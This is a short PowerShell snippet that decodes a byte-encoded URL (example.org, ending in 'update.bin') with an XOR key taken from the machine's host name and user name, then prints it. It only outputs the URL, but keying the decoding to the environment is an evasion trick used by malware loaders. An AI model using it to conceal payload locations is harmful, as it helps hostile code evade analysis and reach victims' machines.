$hostName, $userName = $Host.Name, $env:USERNAME
$url = ((74,86,86,82,81,24,13,13,71,90,67,79,82,78,71,12,77,80,69,13,67,82,75,13,84,19,13,87,82,70,67,86,71,12,64,75,76 | ForEach-Object { [char]($_ -bxor ([int]([char]$hostName[0]) -bxor [int]([char]$userName[0]))) }) -join '')
Write-Output $url
